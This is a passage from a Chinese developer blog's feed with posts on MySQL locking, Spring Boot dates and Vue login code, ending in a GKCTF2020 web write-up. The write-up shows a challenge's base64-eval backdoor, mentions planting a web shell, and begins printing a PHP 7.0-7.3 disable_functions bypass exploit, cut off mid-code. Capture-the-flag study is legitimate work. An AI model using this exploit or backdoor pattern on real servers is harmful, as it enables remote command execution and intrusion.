class="blockquote-center"><p>在关系数据库管理系统里，悲观并发控制（又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”）是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作读某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。</p></blockquote><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p><b>注：要使用悲观锁，我们必须关闭mysql数据库的自动提交属性，因为MySQL默认使用autocommit模式，也就是说，当你执行一个更新操作后，MySQL会立刻将结果进行提交。默认autocommit&#x3D;1; 必须要将值改为0。</b></p><p>当autocommit&#x3D;&#x3D;1时(自动)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户在当前情况下未执行<span class="keyword">start</span> <span class="keyword">transaction</span>命令,默认用户对数据库的操作为孤立的事务，用户的操作不会被锁定，即时提交 =&gt; 即时修改(每个用户的操作都是一个独立的完整事务周期)</span><br></pre></td></tr></table></figure><p>当autocommit&#x3D;&#x3D;0时(手动)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当用户执行<span class="keyword">start</span> <span class="keyword">transaction</span>命令(事务初始化)，直到用户执行<span class="keyword">commit</span>命令(提交)，为一个完整的周期，如果不执行<span class="keyword">commit</span>命令，则系统默认事务回滚。</span><br><span class="line">在手动模式下，一个事务结束的标志为提交事务或者撤销事务。</span><br></pre></td></tr></table></figure><h4 id="事务的开始"><a href="#事务的开始" class="headerlink" title="事务的开始"></a>事务的开始</h4><p>begin或 start transaction 都是显式开启一个事务；</p><h4 id="事务的提交"><a href="#事务的提交" class="headerlink" title="事务的提交"></a>事务的提交</h4><p>commit 或 commit work 都是等价的；</p><h4 id="事务回滚"><a href="#事务回滚" class="headerlink" title="事务回滚"></a>事务回滚</h4><p>rollback 或 rollback work 也是等价的；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> shop <span class="keyword">where</span> goodsid = <span class="string">"货品id"</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## for update是一种排它锁</span></span><br><span class="line"><span class="comment">## 使用后该用户可以查询也可以更新被加锁的数据行。其它用户只能查询但不能更新被加锁的数据行。</span></span><br><span class="line"><span class="comment">## 其他事务必须等本次事务提交后才能执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> shop <span class="keyword">set</span> goods_n=<span class="string">"123"</span></span><br><span class="line"><span class="keyword">where</span> goodsid=<span class="string">"货品id"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/become/p/9209655.html" target="_blank" rel="noopener">乐观锁和悲观锁</a><br><a href="https://www.jianshu.com/p/d2ac26ca6525" target="_blank" rel="noopener">什么是乐观锁，什么是悲观锁</a><br><a href="https://www.cnblogs.com/laoyeye/p/8228467.html" target="_blank" rel="noopener">使用mysql悲观锁解决并发问题</a><br><a href="https://blog.csdn.net/truelove12358/article/details/84738751" target="_blank" rel="noopener">锁的机制</a></p>]]></content>
      
      
      <categories>
          
          <category> 乐观锁 </category>
          
          <category> 悲观锁 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring-bootsql导出date字段时区错误以及格式转换</title>
      <link href="/2020/06/06/spring-boot%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E5%BA%93date%E5%AD%97%E6%AE%B5%E6%97%B6%E5%8C%BA%E9%94%99%E8%AF%AF/"/>
      <url>/2020/06/06/spring-boot%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E5%BA%93date%E5%AD%97%E6%AE%B5%E6%97%B6%E5%8C%BA%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<p>sql添加了个插入自动有个更新时间的字段,但是时区和时间类型老是出错</p><a id="more"></a><p>先设置更新时间的字段类型为timestamp,在springboot导出的时候，需要在application.yml中的文件中把mysql的配置文件后面加入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useUnicode=<span class="keyword">true</span>&amp;characterEncoding=utf-<span class="number">8</span>&amp;useSSL=<span class="keyword">true</span>&amp;serverTimezone=GMT%<span class="number">2</span>B8</span><br><span class="line">-&gt;</span><br><span class="line">serverTimezone=GMT%<span class="number">2</span>B8</span><br></pre></td></tr></table></figure><p>导出的时间类型可能是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; Tue Jan <span class="number">17</span> <span class="number">07</span>:<span class="number">00</span>:<span class="number">28</span> GMT <span class="number">2020</span></span><br></pre></td></tr></table></figure><p>可以利用<b>SimpleDateFormat</b>类来进行转换为<code>yyyy-MM-dd HH:mm:ss</code>类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SimpleDateFormat formatter = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line"></span><br><span class="line">formatter.setTimeZone(TimeZone.getTimeZone(<span class="string">"Asia/Shanghai"</span>));</span><br><span class="line"></span><br><span class="line">formatter.format(log.gettime());</span><br><span class="line"></span><br><span class="line">-&gt; <span class="number">2020</span>-<span class="number">6</span>-<span class="number">6</span> <span class="number">16</span>:<span class="number">25</span>:<span class="number">30</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-cli引用腾讯验证码</title>
      <link href="/2020/06/06/Vue-cli%E5%BC%95%E7%94%A8%E8%85%BE%E8%AE%AF%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
      <url>/2020/06/06/Vue-cli%E5%BC%95%E7%94%A8%E8%85%BE%E8%AE%AF%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>发现自己写登陆页面得验证码什么的总是缺点意思，没那味道(手机端)。最后选择了引用腾讯验证码，前前后后找了好多天，发现网上的教程都是复制粘贴，根本就没有讲详细得用法和代码。真是头疼，他们写博客如果只是复制粘贴，还有啥意思，真是服了，这样复制粘贴以后再看还看得懂吗？？？？？</p><a id="more"></a><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>Vue-cli在引入TCaptcha.js<br>我还在里面下了依赖，不过没啥用，发现还是直接引用最实在。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://ssl.captcha.qq.com/TCaptcha.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>然后把代码添加到methods&#96;里（我这里是放到按钮方法里了，当按登陆按钮后，出现填写验证码界面，只有正确填写验证码后才会进行<b>axios</b>操作）</p><p><a href="https://console.cloud.tencent.com/captcha" target="_blank" rel="noopener">腾讯验证码注册</a>具体注册方法网上还是很详细得，就是用法没有，最重要得是免费还好看！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//appid  为腾讯验证码的参数</span></span><br><span class="line"><span class="keyword">let</span> captcha = <span class="keyword">new</span> TencentCaptcha(<span class="string">'appid'</span>, (rsp) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(rsp)</span><br><span class="line">    <span class="keyword">if</span> (rsp.ret === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">//当ret是0得时候代表成功填写了验证码，我在里面进行了axios操作。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.$message(&#123;</span><br><span class="line">        message: <span class="string">'验证不通过'</span>,</span><br><span class="line">        type: <span class="string">'warning'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, &#123;&#125;)</span><br><span class="line">captcha.show()</span><br><span class="line">          <span class="comment">//  ---------------</span></span><br></pre></td></tr></table></figure><p>返回的数据格式：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">appid: "appid"</span><br><span class="line">bizState: undefined</span><br><span class="line">randstr: "@QQQ"</span><br><span class="line">ret: 0</span><br><span class="line">ticket: "t02a_Q1GYf0ysN49Du__adCw8r4yFoRskWUT0o_HcnQwnVm5jYJPy68m9vDQahsMbVC58rImgM_ReiCJSy1h48yTnxXHL_zE0eiTL5KoW6vpWACviGBw-sW8w**"</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/document/product/1110/36839" target="_blank" rel="noopener">腾讯验证码配置文档</a></p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-cli反向代理以及axios使用</title>
      <link href="/2020/05/31/vue-cli%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E4%BB%A5%E5%8F%8Aaxios%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/05/31/vue-cli%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E4%BB%A5%E5%8F%8Aaxios%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>准备早点把毕业设计写了，之后实习轻松点。写个小说APP玩玩，平常看小说什么的最烦的就是遇到广告了&#x3D; &#x3D;。准备后端用jsoup，前端用vue。到时候给账号的话就我一个个分配吧(不想太多人用，毕竟来源准备爪巴那些不正规的网站的源)，不想写注册了，或者注册时候要一个邀请码啥的。</p><a id="more"></a><p>在config-&gt;index.js下更改proxyTable</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxyTable</span>: &#123;</span><br><span class="line">      <span class="string">'/api'</span>: &#123;  <span class="comment">//使用"/api"来代替"http://[ip]:[port]"</span></span><br><span class="line">        <span class="attribute">target</span>: <span class="string">'http://[ip]:[port]'</span>, <span class="comment">//源地址</span></span><br><span class="line">        <span class="attribute">changeOrigin</span>: true, <span class="comment">//改变源</span></span><br><span class="line">        <span class="attribute">pathRewrite</span>: &#123;</span><br><span class="line">          <span class="string">'^/api'</span>: <span class="string">'/api'</span> <span class="comment">//路径重写</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>运行端口和我的springboot装起来了本地的8080冲突了，所以换成了8084</p><p><img src="/1.jpg"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//单页面中不支持前面的data:&#123;&#125;方式</span></span></span><br><span class="line">    data() &#123;</span><br><span class="line"><span class="actionscript">      <span class="comment">//相当于以前的function data()&#123;&#125;,这是es5之前的写法，新版本可以省略掉function</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span>&#123;</span></span><br><span class="line">        user:&#123;</span><br><span class="line"><span class="actionscript">          username:<span class="string">''</span>,</span></span><br><span class="line"><span class="actionscript">          password:<span class="string">''</span>,</span></span><br><span class="line"><span class="actionscript">          <span class="comment">//为了登录方便，可以直接在这里写好用户名和密码的值</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    beforeRouteEnter (to,<span class="keyword">from</span>,next) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.document.body.style.backgroundColor= <span class="string">'#DCDFE6'</span>;</span></span><br><span class="line">      next();</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    beforeRouteLeave (to,<span class="keyword">from</span>,next) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.document.body.style.backgroundColor= <span class="string">''</span>;</span></span><br><span class="line">      next();</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line"><span class="actionscript">      doLogin()&#123;<span class="comment">//一点击登录按钮，这个方法就会执行</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span>(<span class="keyword">this</span>.user.username == <span class="string">""</span>||<span class="keyword">this</span>.user.password == <span class="string">""</span>)&#123;</span></span><br><span class="line"><span class="actionscript">          alert(<span class="string">"输入用户名或者密码"</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">          axios.post(<span class="string">'/api/conter/register'</span>,<span class="built_in">JSON</span>.stringify(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// username: this.user.username,</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// password: this.user.password</span></span></span><br><span class="line"><span class="actionscript">            userDto: <span class="keyword">this</span>.user</span></span><br><span class="line">          &#125;)).then(</span><br><span class="line">            response =&gt;&#123;</span><br><span class="line">              alert(response.data)</span><br><span class="line">            &#125;</span><br><span class="line">          ).catch(</span><br><span class="line">              err =&gt;&#123;</span><br><span class="line">                alert(err)</span><br><span class="line">              &#125;</span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">          <span class="comment">// alert(JSON.stringify(this.user))</span></span></span><br><span class="line"><span class="actionscript">          <span class="comment">//可以直接把this.user对象传给后端进行校验用户名和密码</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前端是以user对象传输的，后端试了好久，发现还是Map&lt;string,Object&gt; 好获得值.<br><img src="/2.jpg"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(<span class="string">"/register"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">register</span><span class="params">(@RequestBody Map&lt;<span class="keyword">String</span>,userDto&gt; <span class="built_in">map</span>)</span></span>&#123;</span><br><span class="line">    User user= <span class="keyword">new</span> User();</span><br><span class="line">    System.out.<span class="built_in">println</span>(<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="string">"userDto"</span>).getUsername());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-web</title>
      <link href="/2020/05/24/GKCTF2020-web/"/>
      <url>/2020/05/24/GKCTF2020-web/</url>
      
        <content type="html"><![CDATA[<p>不完整，先把打出来的题目写一下，再写复现的好了</p><a id="more"></a><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p id="div-border-left-blue">利用__construct魔术方法，把Ginkgo的值进行base64解密后命令执行。先写个最简单的木马，利用蚁剑连接，发现根目录有个readflag,还有个flag，不过flag里面没东西，估计是没有读取权限。readflag读取也乱码了。发现好多函数不能用，看看phpinfo();里面的有效信息。</p><p><img src="/1.jpg"><br>发现<code>disable_functions</code>禁用了好多关键函数。想着能不能绕过这些函数来运行readflag，获取flag。</p><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">disable_functions绕过</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"/readflag"</span>);<span class="comment">//改成自己想要运行的命令或者文件，比如说这题的readflag</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? 